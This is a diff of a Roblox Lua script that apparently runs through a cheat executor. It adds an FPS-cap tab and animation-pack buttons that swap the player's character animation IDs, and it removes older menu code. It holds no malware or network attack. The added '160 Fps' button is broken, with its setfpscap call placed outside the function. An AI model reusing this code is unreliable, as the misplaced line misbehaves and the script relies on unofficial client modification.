+--------------------------------------------------------------
+--Fps Tab
+---------------------------------------------------------------
+TabF:Label("FPS Locker")
+TabF:Button("1 Fps", function()
+setfpscap(1)
+end)
+TabF:Button("5 Fps", function()
+setfpscap(5)
+end)
+TabF:Button("15 Fps", function()
+setfpscap(15)
+end)
+TabF:Button("30 Fps", function()
+setfpscap(30)
+end)
+TabF:Button("60 Fps", function()
+setfpscap(60)
+end)
+TabF:Button("120 Fps", function()
+setfpscap(120)
+end)
+TabF:Button("160 Fps", function()
+end)
+setfpscap(160)
+TabF:Button("Unlimited Fps", function()
+setfpscap(999)
+end)
+--------------------------------------------------------------------
 
-Misc:Button(
-    "Clone Character",
-    function()
- local character = game:GetService("Players").LocalPlayer.Character
-
-local start_pos = character.HumanoidRootPart.Position
-local start_time = tick()
-
-while tick() - start_time <= 10 do
-    local angle = math.rad(character.HumanoidRootPart.Rotation.Y)
-    local forward_vector = character.HumanoidRootPart.CFrame.LookVector
-    local up_vector = character.HumanoidRootPart.CFrame.UpVector
-    local right_vector = forward_vector:Cross(up_vector).Unit
-    local new_cframe = CFrame.new(start_pos) * CFrame.Angles(0, angle, 0)
-    local move_direction = forward_vector + right_vector * math.sin(tick() * 50000) * 2
-    character.HumanoidRootPart.CFrame = new_cframe + move_direction * 5
-    wait()
+TabA:Label("Animations")
+TabA:Button("Toy",function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
 end
-
-character.HumanoidRootPart.CFrame = CFrame.new(start_pos)
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=782842708"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=782843345"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=782847020"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921159222"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=782843869"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+    
+TabA:Button("Sneaky",function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1132473842"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1132477671"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1132494274"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1132510133"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1132489853"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1132469004"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1132461372"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
 end)
 
-Misc:Button(
-    "Double Speed",
-    function()
-    local giga = game.Players.LocalPlayer.Character
-	local liga = giga:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")
-
-	for i,v in next, liga:GetPlayingAnimationTracks() do
-		v:AdjustSpeed(v.Speed * 4)
-	end
-	end)
-
-Misc:Button(
-    "Half Speed",
-    function()
-    local giga = game.Players.LocalPlayer.Character
-	local liga = giga:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")
-
-	for i,v in next, liga:GetPlayingAnimationTracks() do
-		v:AdjustSpeed(v.Speed * 0.5)
-	end
-	end)
-
-Misc:Toggle(
-    "Loop Anim",
-    false,
-    function(state)
-    if state then
-	game.Players.LocalPlayer.Character.Animate.Disabled = true
-elseif not state then
-	game.Players.LocalPlayer.Character.Animate.Disabled = false
+TabA:Button("Ghost",function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
 end
-	 end)
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
 
-local Animations = serv:Channel("Animations")
-
-  Animations:Button(
-	"cowboy",
-	function()
-        local tomtoediendo = game.Players.LocalPlayer.Character
-        tomtoediendo:FindFirstChild("Animate").Disabled = true 
-        for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
-        v:Stop() 
-        end
-        tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1014390418"
-        tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1014398616"
-        tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1014401683"
-        tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1014421541"
-        tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1014394726"
-        tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1014384571"
-        tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1014380606"
-        tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
-        tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
-        tomtoediendo:FindFirstChild("Animate").Disabled = false
-        end)
-
- Animations:Button(
-	"Sneaky",
-    function()
-        local tomtoediendo = game.Players.LocalPlayer.Character
-    tomtoediendo:FindFirstChild("Animate").Disabled = true 
-    for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
-    v:Stop() 
-    end
-    tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1132473842"
-    tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1132477671"
-    tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1132494274"
-    tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1132510133"
-    tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1132489853"
-    tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1132469004"
-    tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1132461372"
-    tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
-    tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
-    tomtoediendo:FindFirstChild("Animate").Disabled = false
-    end)
-
-Animations:Button(
-        "Patrol",
-        function()
-            local tomtoediendo = game.Players.LocalPlayer.Character
-        tomtoediendo:FindFirstChild("Animate").Disabled = true 
-        for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
-        v:Stop() 
-        end
-        tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1149612882"
-        tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1150842221"
-        tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1150967949"
-        tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1151231493"
-        tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1150944216"
-        tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1148863382"
-        tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1148811837"
-        tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=1151204998"
-        tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=1151221899"
-        tomtoediendo:FindFirstChild("Animate").Disabled = false
-        end)
-        
- Animations:Button(
-            "Ghost",
-            function()
-                local tomtoediendo = game.Players.LocalPlayer.Character
-    tomtoediendo:FindFirstChild("Animate").Disabled = true 
-    for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
-    v:Stop() 
-    end
-    tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
-    tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
-    tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
-    tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
-    tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
-    tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
-    tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
-    tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
-    tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
-    tomtoediendo:FindFirstChild("Animate").Disabled = false
-    end)
-
-Animations:Button(
-        "Confident",
-        function()
-            local tomtoediendo = game.Players.LocalPlayer.Character
-            tomtoediendo:FindFirstChild("Animate").Disabled = true 
-            for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
-            v:Stop() 
-            end
-            tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1069987858"
-            tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1069987858"
-            tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1070001516"
-            tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1070017263"
-            tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1069984524"
-            tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1069973677"
-            tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1069946257"
-            tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=742639220"
-            tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=742639812"
-            tomtoediendo:FindFirstChild("Animate").Disabled = false
-            end)
-
-Animations:Button(
-    "Zombie",
-    function()
-        local tomtoediendo = game.Players.LocalPlayer.Character
-        tomtoediendo:FindFirstChild("Animate").Disabled = true 
-        for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
-        v:Stop() 
-        end
-        tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
-        tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
-        tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
-        tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
-        tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
-        tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
-        tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
-        tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
-        tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
-        tomtoediendo:FindFirstChild("Animate").Disabled = false
-        end)
-
-Animations:Button(
-    "Worewolf",
-     function()
-        local tomtoediendo = game.Players.LocalPlayer.Character
-        tomtoediendo:FindFirstChild("Animate").Disabled = true 
-        for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
-        v:Stop() 
-        end
-        tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083195517"
-        tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083214717"
-        tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083216690"
-        tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083178339"
-        tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
-        tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083189019"
-        tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083182000"
-        tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
-        tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
-        tomtoediendo:FindFirstChild("Animate").Disabled = false
-        end)
-    
- Animations:Button(
-    "Mage",
-     function()
-        local tomtoediendo = game.Players.LocalPlayer.Character
-        tomtoediendo:FindFirstChild("Animate").Disabled = true 
-        for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
-        v:Stop() 
-        end
-        tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=707742142"
-        tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=707855907"
-        tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=707861613"
-        tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
-        tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
-        tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
-        tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=707826056"
-        tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
-        tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
-        tomtoediendo:FindFirstChild("Animate").Disabled = false
-        end)
-
- Animations:Button(
-  "levitation",
-  function()
+TabA:Button("Zombie",function()
     local tomtoediendo = game.Players.LocalPlayer.Character
     tomtoediendo:FindFirstChild("Animate").Disabled = true 
     for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
     v:Stop() 
     end
-    tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
-    tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
-    tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
-    tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
-    tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
-    tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
-    tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
+    tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
+    tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
+    tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
+    tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
+    tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
+    tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
+    tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
     tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
     tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
     tomtoediendo:FindFirstChild("Animate").Disabled = false
     end)
 
-    Animations:Button(
-        "Vampire",
-        function()
-            local tomtoediendo = game.Players.LocalPlayer.Character
-            tomtoediendo:FindFirstChild("Animate").Disabled = true 
-            for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
-            v:Stop() 
-            end
-            tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083445855"
-            tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083450166"
-            tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083462077"
-            tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
-            tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083455352"
-            tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083443587"
-            tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
-            tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
-            tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
-            tomtoediendo:FindFirstChild("Animate").Disabled = false
-            end)
-    
-Animations:Button(
-    "Cartonny",
-     function()
-        local tomtoediendo = game.Players.LocalPlayer.Character
-    tomtoediendo:FindFirstChild("Animate").Disabled = true 
-    for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
-    v:Stop() 
-    end
-    tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=742637544"
-    tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=742638445"
-    tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=742638842"
-    tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=742640026"
-    tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=742637942"
-    tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=742637151"
-    tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=742636889"
-    tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
-    tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
-    tomtoediendo:FindFirstChild("Animate").Disabled = false
-    end)
-    
-
-Animations:Button(
-  "Ninja",
-  function()
+TabA:Button("Werewolf",function()
     local tomtoediendo = game.Players.LocalPlayer.Character
-    tomtoediendo:FindFirstChild("Animate").Disabled = true 
-    for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
-    v:Stop() 
-    end
-    tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=656117400"
-    tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=656118341"
-    tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852"
-    tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766"
-    tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
-    tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=656115606"
-    tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=656114359"
-    tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
-    tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
-    tomtoediendo:FindFirstChild("Animate").Disabled = false
-    end)
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083195517"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083214717"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083216690"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083178339"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083189019"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083182000"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
 
-    Animations:Button(
-  "Pirate",
-  function()
+TabA:Button("Mage",function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=707742142"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=707855907"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=707861613"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=707826056"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+
+TabA:Button("Levitation",function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+
+TabA:Button("Vampire",function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083445855"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083450166"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083462077"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083455352"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083443587"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+
+TabA:Button("Cartonny",function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=742637544"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=742638445"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=742638842"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=742640026"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=742637942"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=742637151"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=742636889"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+
+TabA:Button("Ninja",function()
+   local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=656117400"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=656118341"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=656115606"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=656114359"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+
+TabA:Button("Pirate",function()
     local tomtoediendo = game.Players.LocalPlayer.Character
     tomtoediendo:FindFirstChild("Animate").Disabled = true 
     for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
@@ -1437,416 +1550,567 @@ Animations:Button(
     tomtoediendo:FindFirstChild("Animate").Disabled = false
     end)
 
-    Animations:Button(
-        "Hero",
-        function()
-            local tomtoediendo = game.Players.LocalPlayer.Character
-            tomtoediendo:FindFirstChild("Animate").Disabled = true 
-            for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
